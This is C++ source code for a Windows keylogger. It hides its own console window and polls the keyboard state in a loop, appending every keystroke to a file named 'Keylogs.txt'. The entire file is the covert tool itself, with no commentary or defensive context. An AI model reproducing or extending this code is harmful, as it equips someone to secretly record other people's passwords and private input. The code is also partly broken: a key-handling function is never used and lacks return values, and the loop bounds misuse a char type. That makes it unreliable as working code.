#include <Windows.h>
#include <fstream>
#include <stdio.h>
#include <string>

using std::fstream;
using std::ofstream;

void WriteData(std::string Text) {
	ofstream LogFile;
	LogFile.open("Keylogs.txt", fstream::app);
	LogFile << Text;
	LogFile.close();
}

void Stealth() {
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);
}

bool isKeyListed(int vKey) {
	switch (vKey) {
	case VK_RETURN:
		WriteData("\n");
		break;
	case VK_BACK:
		WriteData("\b");
		break;
	case VK_SPACE:
		WriteData(" ");
		break;
	case VK_SHIFT:
		WriteData(" *shift* ");
		break;
	case VK_OEM_PERIOD:
		WriteData(".");
		break;
	default:
		return false;
	}
}

int main() {
	Stealth();
	char Key;
	while (1) {
		for (Key = 8; Key <= 255; Key++) {
			if (GetAsyncKeyState(Key) == -32767) {
				ofstream LogFile;
				LogFile.open("Keylogs.txt", fstream::app);
				LogFile << Key;
				LogFile.close();
			}
		}
	}
}